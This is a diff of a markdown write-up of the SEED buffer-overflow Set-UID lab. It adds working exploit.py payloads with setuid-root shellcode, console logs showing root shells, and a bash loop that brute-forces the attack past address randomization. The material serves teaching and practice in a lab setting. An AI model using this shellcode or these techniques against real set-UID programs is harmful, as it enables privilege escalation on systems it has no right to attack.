@@ -500,7 +500,7 @@ Input size: 517
 
 ## Task 5: Launching Attack on $64$-bit Program (Level 3)
 
-Although the x86-64 architecture supports $64$-bit address space, only the address from <code>0x00</code> through <code>0x00007fffffffffff</code> is allowed. That means for every address ($8$ bytes), the highest two bytes are always zeros. More specifically, in a typical $48$-bit implementation, *canonical* address refers to one in the range code>0x00</code> through <code>0x00007fffffffffff</code> and code>0xffff800000000000</code> through <code>0xffffffffffffffff</code>. Any address outside this range is *non-canonical*. In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied onto the stack via <code>strcpy()</code>, which will stop copying when it sees a zero. Therefore, if zero appears in the middle of the payload, the content after the zero cannot be copied onto the stack. How to solve this problem is the most difficult challenge in this attack.
+Although the x86-64 architecture supports $64$-bit address space, only the address from <code>0x00</code> through <code>0x00007fffffffffff</code> is allowed. That means for every address ($8$ bytes), the highest two bytes are always zeros. More specifically, in a typical $48$-bit implementation, *canonical* address refers to one in the range <code>0x00</code> through <code>0x00007fffffffffff</code> and <code>0xffff800000000000</code> through <code>0xffffffffffffffff</code>. Any address outside this range is *non-canonical*. In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied onto the stack via <code>strcpy()</code>, which will stop copying when it sees a zero. Therefore, if zero appears in the middle of the payload, the content after the zero cannot be copied onto the stack. How to solve this problem is the most difficult challenge in this attack.
 
 First, I modified the <code>exploit.py</code> in the way that a <code>badfile</code> filled with $1000$ A's was generated:
 
@@ -571,7 +571,7 @@ gdb-peda$ x $rbp
 0x7fffffffdc10:	0x00007fffffffe020
 ```
 
-To better understand the stack frame layout in x86-64 architecture, I went through AMD64 ABI 1.0 published on December 22, 2018 and found something really helpful:
+To better understand the stack frame layout in x86-64 architecture, I went through [AMD64 ABI 1.0](https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf) published on December 22, 2018 and found something really helpful:
 
 > Each function has a frame on the run-time stack. This stack grows downwards from high addresses ... The value <code>%rsp + 8</code> is always a multiple of $16$ ($32$ or $64$) when control is transferred to the function entry point. The stack pointer, <code>%rsp</code>, always points to the end of the latest allocated stack frame. The $128$-byte area beyond the location pointed to by <code>%rsp</code> is considered to be reserved and shall not be modified by signal or interrupt handlers. Therefore, functions may use this area for temporary data that is not needed across function calls. In particular, leaf functions may use this area for their entire stack frame, rather than adjusting the stack pointer in the prologue and epilogue. This area is known as the *red zone* ... After the argument values have been computed, they are placed either in registers or pushed on the stack ... The size of each argument gets rounded up to eight bytes (therefore the stack will always be eight-byte aligned).
 
@@ -613,7 +613,175 @@ Input size: 517
 
 ## Task 6: Launching Attack on $64$-bit Program (Level 4)
 
+Using the similar technique as in [Level 2](#task-4-launching-attack-without-knowing-buffer-size-level-2), I deployed the following <code>exploit.py</code> file:
 
+```python
+content = bytearray(0x90 for i in range(517))
+
+start = 517 - len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+ret    = 0xffffe258 + 120 
+L = 8
+addr = (ret).to_bytes(L, byteorder='little')
+content[0 : 15] = addr * 2
+
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+Note that <code>L</code> is switched to $8$ and the designated return address will be taking $16$ bytes (i.e., the size of two words), considering that the buffer size is $10$.
+
+As a result, level 4 is solved:
+
+```console
+~/Documents/BufferSetUID/code$ vim exploit.py
+~/Documents/BufferSetUID/code$ ./exploit.py
+~/Documents/BufferSetUID/code$ ./stack-L4
+Input size: 517
+==== Returned Properly ====
+```
+
+## Task 7: Defeating <code>dash</code>'s Countermeasure
+
+To begin with, let <code>/bin/sh</code> point back to <code>/bin/dash</code>:
+
+```console
+$ sudo ln -sf /bin/dash /bin/sh
+```
+
+Compile and run <code>call_shellcode.c</code> with the <code>setuid()</code> system call:
+
+```console
+~Documents/BufferSetUID/shellcode$ make setuid
+gcc -m32 -z execstack -o a32.out call_shellcode.c
+gcc -z execstack -o a64.out call_shellcode.c
+sudo chown root a32.out a64.out
+sudo chmod 4755 a32.out a64.out
+~Documents/BufferSetUID/shellcode$ ./a32.out
+# id
+uid=0(root) gid=1001(seed) groups=1001(seed),120(docker)
+# echo On the Bonnie Bonnie Banks of Loch Lomond
+On the Bonnie Bonnie Banks of Loch Lomond
+# exit
+~Documents/BufferSetUID/shellcode$ ./a64.out
+# id
+uid=0(root) gid=1001(seed) groups=1001(seed),120(docker)
+# whoami
+root
+# exit
+```
+
+Without the <code>setuid()</code> system call:
+
+```console
+~Documents/BufferSetUID/shellcode$ gcc -z execstack -o call_shellcode call_shellcode.c
+~Documents/BufferSetUID/shellcode$ ./call_shellcode
+$ whoami
+seed
+$ echo On the Bonnie Bonnie Banks of Loch Lomond
+On the Bonnie Bonnie Banks of Loch Lomond
+$ exit
+~Documents/BufferSetUID/shellcode$ ./a32.out
+$ whoami
+seed
+$ echo On the steep steep side of Ben Lomond
+On the steep steep side of Ben Lomond
+$ exit
+~Documents/BufferSetUID/shellcode$ ./a64.out
+$ whoami
+seed
+$ echo Ye'll take the high road and I'll take the low road
+Yell take the high road and Ill take the low road
+$ exit
+```
+
+We can tell according to the different results from the <code>whoami</code> command that with the <code>setuid()</code> system call real UID is changed to zero and the program is owned by root.
+
+Based on this knowledge, to redo [Task 3](#task-3-launching-attack-on-32-bit-program-level-1), I modified the shellcode block of <code>exploit.py</code>:
+
+```python
+!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0"
+  "\x31\xdb"
+  "\xb0\xd5"
+  "\xcd\x80"
+  "\x31\xc0"
+  "\x50"
+  "\x68""//sh"
+  "\x68""/bin"
+  "\x89\xe3"
+  "\x50"
+  "\x53"
+  "\x89\xe1"
+  "\x99"
+  "\xb0\x0b"
+  "\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)               # Change this number 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffcdc8 + 120          # Change this number 
+offset = 112              # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+Running this code is able to get the root shell:
+
+```console
+~/Documents/BufferSetUID/code$ vim exploit.py
+~/Documents/BufferSetUID/code$ ./exploit.py
+~/Documents/BufferSetUID/code$ ./stack-L1
+Input size: 517
+# id
+uid=0(root) gid=1001(seed) groups=1001(seed),120(docker)
+```
+
+## Task 8: Defeating Address Randomization
+
+By resetting the environment
+
+```console
+$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
+```
+
+address space including the positions of the stack, virtual dynamic shared object page, shared memory regions, and data segments is randomized, which is the most secure system setting.
+
+Use the following shell script to brute-force the attack:
+
+```console
+#!/bin/bash
+SECONDS=0
+value=0
+while true; do
+    value=$(( $value + 1 ))
+    duration=$SECONDS
+    min = $(( $duration / 60 ))
+    sec = $(( $duration % 60 ))
+    echo "$min minutes and $sec seconds elapsed."
+    echo "The program has been running $value times so far."
+    ./stack-L1
+done
+```
 
 ## Notes
 
